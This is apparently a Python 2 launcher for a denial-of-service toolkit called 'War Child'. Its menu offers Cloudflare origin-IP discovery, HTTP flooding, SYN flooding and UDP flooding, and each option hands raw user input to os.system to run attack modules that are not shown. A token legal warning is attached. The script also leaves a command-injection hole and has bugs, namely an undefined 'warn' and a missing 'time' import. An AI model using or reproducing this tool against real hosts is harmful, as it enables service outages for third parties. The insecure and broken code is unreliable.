#!/usr/bin/env python

import os
import re 
import platform
import colorama
from colorama import Fore, Back, Style



R='\033[1;31m'
B='\033[1;34m'
Y='\033[1;33m'
G='\033[1;32m'
C='\033[1;36m'
N='\033[0m' 

if platform.system() == 'Windows':
	warn("This script has not yet been tested on a Windows machine.")
elif platform.system() == 'Linux':
	_continue = True
	pass



def main():
	
	print \
"""
\033[01;33m     ...    .     ...                                        ...                         .          ..    ..       \033[0m   
\033[01;33m  .~`"888x.!**h.-``888h.                                  xH88"`~ .x8X      .uef^"      @88>  x .d88"   dF         \033[0m  
\033[01;33m dX   `8888   :X   48888>                 .u    .       :8888   .f"8888Hf :d88E         %8P    5888R   '88bu.      \033[0m  
\033[01;32m'888x  8888  X88.  '8888>        u      .d88B :@8c     :8888>  X8L  ^""`  `888E          .     '888R   '*88888bu   \033[0m  
\033[01;32m'88888 8888X:8888:   )?""`    us888u.  ="8888f8888r    X8888  X888h        888E .z8k   .@88u    888R     ^"*8888N  \033[0m 
\033[01;32m `8888>8888 '88888>.88h.   .@88 "8888"   4888>'88"     88888  !88888.      888E~?888L ''888E`   888R    beWE "888L \033[0m
\033[01;31m   `8" 888f  `8888>X88888. 9888  9888    4888> '       88888   %88888      888E  888E   888E    888R    888E  888E \033[0m
\033[01;31m  -~` '8%"     88" `88888X 9888  9888    4888>         88888 '> `8888>     888E  888E   888E    888R    888E  888E \033[0m
\033[01;31m  .H888n.      XHn.  `*88! 9888  9888   .d888L .+      `8888L %  ?888   !  888E  888E   888E    888R    888E  888F \033[0m
\033[01;34m :88888888x..x88888X.  `!  9888  9888   ^"8888*"        `8888  `-*""   /   888E  888E   888&   .888B . .888N..888  \033[0m
\033[01;34m f  ^%888888% `*88888nx"   "888*""888"     "Y"            "888.      :"   m888N= 888>   R888"  ^*888%   `"888*""   \033[0m
\033[01;34m      `"**"`    `"**""      ^Y"   ^Y'                       `""***~"`      `Y"   888     ""      "%        ""      \033[0m
\033[01;0m                                                                                J88"                               \033[0m
\033[01;0m                                                                                @%                                 \033[0m
\033[01;0m                                                                              :"                                   \033[0m

[---]       War Child, Denial Of Service audit toolkit. | version: 1.0      [---]
[---]                                                                       [---]
[---]                  Created by Souhardya Sardar                          [---]
[---]                    github.com/Souhardya                               [---]
[---]                  ~ Special thanks to Morty ~                          [---]
[---]                                                                       [---]
[---]             ~  8th Sillycon Open Source Project ~                     [---]


LEGAL WARNING: While this may be helpful for some, there are significant risks.
You could go to jail on obstruction of justice charges just for running Warchild,
even though you are innocent. Your are on notice, that using this tool outside your
"own" environment is considered malicious and is against the law. Use with caution.
				

[1] Cloudflare Bust
[2] HTTP Flood Mode
[3] TCP SYN Flood Mode
[4] UDP Flood Mode 


"""

	global option
	option = raw_input('Choose from the following options #~: ')
 
	if option:
		if option == '1':
		  cloudflarebust()

		elif option == '2':
			httpdos()

		elif option == '3':
			synflood() 

		elif option == "4":
			udpflood()	       
				
		else:
			print '\nInvalid Choice\n'
			time.sleep(0.9)
			main()    
 
	else:
		print '\nYou Must Enter An Option (Check if your typo is corrected.)\n'
		time.sleep(0.9)
		main()


def cloudflarebust():
	print("This will search the cloudflare protected website for misconfigured DNS and will extract backend real IP.")
	cloudbam = raw_input("Select a Target Ex: example.com (no http/https and www ) : ")
	os.system("cd modules && python cloudflare.py --target %s"%cloudbam)


def httpdos():
	print("This will flood the websites with 100's and 1000's of http header requests and will try to suck all of it's resources.")
	http = raw_input("Select a Target ( Ex http/site.suffix ) Don't use www in anyway  : ")
	os.system("cd modules && python http_flood.py %s"% http)




def synflood():
	print("This will bombard the host with infinite syn packets and tries to exhaust the resources.")
	synboom = raw_input("Enter the host name : ")
	synlol=raw_input("Enter the port : ")
	os.system("cd modules && python syn.py %s %s "% (synboom, synlol))


def udpflood():
	print("This will send infinite UDP packets and tries to exhaust host's resource fully.")
	os.system("cd modules && python udp.py  ")




if __name__ == '__main__':
	main()
